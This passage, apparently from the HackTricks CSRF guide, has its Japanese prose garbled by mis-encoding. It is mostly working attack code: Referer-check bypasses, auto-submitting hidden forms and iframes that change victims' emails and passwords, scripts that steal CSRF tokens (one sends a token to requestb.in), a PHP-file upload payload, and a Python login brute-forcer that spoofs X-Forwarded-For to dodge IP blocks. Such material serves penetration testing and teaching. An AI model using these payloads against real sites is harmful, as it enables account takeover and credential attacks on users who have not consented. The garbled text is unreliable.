2. **ã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚¿ã‚¤ãƒ—ã®å¤‰æ›´**: ã‚µãƒ¼ãƒãƒ¼ãŒã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã‚’JSONã¨ã—ã¦èªè­˜ã™ã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¤ã¤ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€`Content-Type: text/plain; application/json`ã§ãƒ‡ãƒ¼ã‚¿ã‚’é€ä¿¡ã§ãã¾ã™ã€‚ã“ã‚Œã¯ãƒ—ãƒªãƒ•ãƒ©ã‚¤ãƒˆãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’ãƒˆãƒªã‚¬ãƒ¼ã—ã¾ã›ã‚“ãŒã€ã‚µãƒ¼ãƒãƒ¼ãŒ`application/json`ã‚’å—ã‘å…¥ã‚Œã‚‹ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã‚Œã°æ­£ã—ãå‡¦ç†ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **SWFãƒ•ãƒ©ãƒƒã‚·ãƒ¥ãƒ•ã‚¡ã‚¤ãƒ«ã®åˆ©ç”¨**: ã‚ã¾ã‚Šä¸€èˆ¬çš„ã§ã¯ã‚ã‚Šã¾ã›ã‚“ãŒã€SWFãƒ•ãƒ©ãƒƒã‚·ãƒ¥ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã“ã®ã‚ˆã†ãªåˆ¶é™ã‚’å›é¿ã™ã‚‹æ–¹æ³•ã‚‚ã‚ã‚Šã¾ã™ã€‚ã“ã®æŠ€è¡“ã®è©³ç´°ã«ã¤ã„ã¦ã¯ã€[ã“ã®æŠ•ç¨¿](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

### ãƒªãƒ•ã‚¡ãƒ©ãƒ¼/ã‚ªãƒªã‚¸ãƒ³ãƒã‚§ãƒƒã‚¯ã®ãƒã‚¤ãƒ‘ã‚¹

**ãƒªãƒ•ã‚¡ãƒ©ãƒ¼ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é¿ã‘ã‚‹**

ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã¯ã€'Referer'ãƒ˜ãƒƒãƒ€ãƒ¼ãŒå­˜åœ¨ã™ã‚‹å ´åˆã®ã¿æ¤œè¨¼ã™ã‚‹ã“ã¨ãŒã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’ãƒ–ãƒ©ã‚¦ã‚¶ãŒé€ä¿¡ã—ãªã„ã‚ˆã†ã«ã™ã‚‹ãŸã‚ã«ã€æ¬¡ã®HTMLãƒ¡ã‚¿ã‚¿ã‚°ã‚’ä½¿ç”¨ã§ãã¾ã™ï¼š
```xml
<meta name="referrer" content="never">
```
ã“ã‚Œã«ã‚ˆã‚Šã€ã€ŒRefererã€ãƒ˜ãƒƒãƒ€ãƒ¼ãŒçœç•¥ã•ã‚Œã€ä¸€éƒ¨ã®ã‚¢ãƒ—ãƒªã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã§ã®æ¤œè¨¼ãƒã‚§ãƒƒã‚¯ã‚’å›é¿ã§ãã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

**Regexp ãƒã‚¤ãƒ‘ã‚¹**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Referrer ãŒãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿å†…ã§é€ä¿¡ã™ã‚‹ URL ã®ã‚µãƒ¼ãƒãƒ¼ã®ãƒ‰ãƒ¡ã‚¤ãƒ³åã‚’è¨­å®šã™ã‚‹ã«ã¯ã€æ¬¡ã®ã‚ˆã†ã«ã—ã¾ã™ï¼š
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **HEADãƒ¡ã‚½ãƒƒãƒ‰ãƒã‚¤ãƒ‘ã‚¹**

[**ã“ã®CTFã®è§£èª¬**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution)ã®æœ€åˆã®éƒ¨åˆ†ã§ã¯ã€[Oakã®ã‚½ãƒ¼ã‚¹ã‚³ãƒ¼ãƒ‰](https://github.com/oakserver/oak/blob/main/router.ts#L281)ãŒèª¬æ˜ã•ã‚Œã¦ãŠã‚Šã€ãƒ«ãƒ¼ã‚¿ãƒ¼ã¯**HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦å‡¦ç†ã™ã‚‹**ã‚ˆã†ã«è¨­å®šã•ã‚Œã¦ã„ã¾ã™ - ã“ã‚Œã¯Oakã«ç‰¹æœ‰ã®ä¸€èˆ¬çš„ãªå›é¿ç­–ã§ã™ã€‚HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’å‡¦ç†ã™ã‚‹ç‰¹å®šã®ãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã®ä»£ã‚ã‚Šã«ã€å˜ã«**GETãƒãƒ³ãƒ‰ãƒ©ãƒ¼ã«æ¸¡ã•ã‚Œã¾ã™ãŒã€ã‚¢ãƒ—ãƒªã¯ãƒ¬ã‚¹ãƒãƒ³ã‚¹ãƒœãƒ‡ã‚£ã‚’å‰Šé™¤ã—ã¾ã™**ã€‚

ã—ãŸãŒã£ã¦ã€GETãƒªã‚¯ã‚¨ã‚¹ãƒˆãŒåˆ¶é™ã•ã‚Œã¦ã„ã‚‹å ´åˆã¯ã€**GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã¨ã—ã¦å‡¦ç†ã•ã‚Œã‚‹HEADãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™**ã€‚

## **ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã®ä¾‹**

### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã®æŠ½å‡º**

**CSRFãƒˆãƒ¼ã‚¯ãƒ³**ãŒ**é˜²å¾¡**ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹å ´åˆã€[**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens)è„†å¼±æ€§ã‚„[**ãƒ€ãƒ³ã‚°ãƒªãƒ³ã‚°ãƒãƒ¼ã‚¯ã‚¢ãƒƒãƒ—**](dangling-markup-html-scriptless-injection/)è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦**æŠ½å‡ºã‚’è©¦ã¿ã‚‹**ã“ã¨ãŒã§ãã¾ã™ã€‚

### **HTMLã‚¿ã‚°ã‚’ä½¿ç”¨ã—ãŸGET**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
ä»–ã®HTML5ã‚¿ã‚°ã§è‡ªå‹•çš„ã«GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã§ãã‚‹ã‚‚ã®ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### ãƒ•ã‚©ãƒ¼ãƒ GETãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### ãƒ•ã‚©ãƒ¼ãƒ POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### iframeã‚’é€šã˜ãŸãƒ•ã‚©ãƒ¼ãƒ POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Ajax POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST ãƒªã‚¯ã‚¨ã‚¹ãƒˆ v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### iframeå†…ã‹ã‚‰ã®ãƒ•ã‚©ãƒ¼ãƒ POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆ
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã€ãƒ•ã‚©ãƒ¼ãƒ ã€Ajaxã‚’ä½¿ç”¨ã—ã¦Postãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€iframeã¨ãƒ•ã‚©ãƒ¼ãƒ ã‚’ä½¿ç”¨ã—ã¦POSTãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã™ã‚‹**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **ãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€2ã¤ã®iframeã‚’ä½¿ç”¨ã—ã¦é€ä¿¡ã™ã‚‹**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTAjaxã‚’ä½¿ç”¨ã—ã¦CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ç›—ã¿ã€ãƒ•ã‚©ãƒ¼ãƒ ã§POSTã‚’é€ä¿¡ã™ã‚‹**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF with Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRFãƒ­ã‚°ã‚¤ãƒ³ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹

ã“ã®ã‚³ãƒ¼ãƒ‰ã¯ã€CSRFãƒˆãƒ¼ã‚¯ãƒ³ã‚’ä½¿ç”¨ã—ã¦ãƒ­ã‚°ã‚¤ãƒ³ãƒ•ã‚©ãƒ¼ãƒ ã‚’ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã¾ã™ï¼ˆå¯èƒ½ãªIPãƒ–ãƒ©ãƒƒã‚¯ãƒªã‚¹ãƒˆã‚’å›é¿ã™ã‚‹ãŸã‚ã«ã€ãƒ˜ãƒƒãƒ€ãƒ¼X-Forwarded-Forã‚‚ä½¿ç”¨ã—ã¦ã„ã¾ã™ï¼‰ï¼š
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## ãƒ„ãƒ¼ãƒ« <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## å‚è€ƒæ–‡çŒ®

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

â€‹

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

çµŒé¨“è±Šå¯Œãªãƒãƒƒã‚«ãƒ¼ã‚„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ãƒãƒ³ã‚¿ãƒ¼ã¨ã‚³ãƒŸãƒ¥ãƒ‹ã‚±ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å–ã‚‹ãŸã‚ã«ã€[**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy)ã‚µãƒ¼ãƒãƒ¼ã«å‚åŠ ã—ã¾ã—ã‚‡ã†ï¼

**ãƒãƒƒã‚­ãƒ³ã‚°ã®æ´å¯Ÿ**\
ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚¹ãƒªãƒ«ã¨èª²é¡Œã«æ·±ãæ˜ã‚Šä¸‹ã’ãŸã‚³ãƒ³ãƒ†ãƒ³ãƒ„ã«å‚åŠ ã—ã¾ã—ã‚‡ã†

**ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ãƒãƒƒã‚¯ãƒ‹ãƒ¥ãƒ¼ã‚¹**\
ãƒªã‚¢ãƒ«ã‚¿ã‚¤ãƒ ã®ãƒ‹ãƒ¥ãƒ¼ã‚¹ã¨æ´å¯Ÿã‚’é€šã˜ã¦ã€æ€¥é€Ÿã«é€²åŒ–ã™ã‚‹ãƒãƒƒã‚­ãƒ³ã‚°ã®ä¸–ç•Œã‚’æŠŠæ¡ã—ã¾ã—ã‚‡ã†

**æœ€æ–°ã®ãŠçŸ¥ã‚‰ã›**\
æ–°ã—ã„ãƒã‚°ãƒã‚¦ãƒ³ãƒ†ã‚£ã®é–‹å§‹ã‚„é‡è¦ãªãƒ—ãƒ©ãƒƒãƒˆãƒ•ã‚©ãƒ¼ãƒ ã®æ›´æ–°ã«ã¤ã„ã¦æƒ…å ±ã‚’å¾—ã¾ã—ã‚‡ã†

**ç§ãŸã¡ã«å‚åŠ ã—ã¦** [**Discord**](https://discord.com/invite/N3FrSbmwdy)ã§ä»Šæ—¥ã‹ã‚‰ãƒˆãƒƒãƒ—ãƒãƒƒã‚«ãƒ¼ã¨ã‚³ãƒ©ãƒœãƒ¬ãƒ¼ã‚·ãƒ§ãƒ³ã‚’å§‹ã‚ã¾ã—ã‚‡ã†ï¼

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* [**HackTricks**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>
{% endhint %}
